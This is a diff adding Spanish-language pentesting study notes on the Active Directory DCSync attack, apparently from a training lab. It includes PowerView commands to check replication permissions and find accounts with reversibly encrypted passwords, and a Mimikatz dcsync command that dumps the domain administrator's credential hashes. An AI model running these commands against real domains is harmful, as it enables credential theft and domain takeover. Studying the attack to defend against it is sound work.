@@ -276,3 +276,28 @@ Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $it
 Get-DomainObjectACL -Identity "<group name>" -ResolveGUIDs | ? {$_.SecurityIdentifier -eq $sid}
 #Enumerar sobre grupo con el usuario especificado en $sid
 
+	### DCSync
+Version LINUX en "From_Linux" directory
+
+Es una tecnica que intenta roban la contraseña de la base de datos de AD mediante Directory Replication Service Remote Protocol que es usado por el dominio para replicar la info de este.
+La idea es que el DC nos brinde los hashes NTLM
+Se necesita cuenta de usuario con privilegios: Replicating Directory Changes and Replicating Directory Changes All permissions set
+
+##Revisar permisos: PowerView
+Get-DomainUser -Identity <user>  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
+#Permite obtener el sid del usuario
+$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
+#Se crea variable contenedora del sid y se realiza la consulta acerca de los permisos que posee referentes a este ataque
+
+##Encryption password storasge option: PowerView
+Cuando esta opcion esta habilitada, las contraseñas son almacenadas encriptadas en RC4. La clave para desencriptar, entonces, se encuentra en el registro Syskey y puede ser extraida por domain admin o equivalente
+Tools como secretsdump.py (version Linux) puedes desencriptar cualquier contraseña que tengan esta opcion habilitada realizando el ataque de DCSync con una cuenta Domain admin.
+
+Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
+#Nos devuelve las cuentas que tienen esta opciona acivada
+
+##DCSync: Mimikatz
+.\mimikatz.exe
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
+
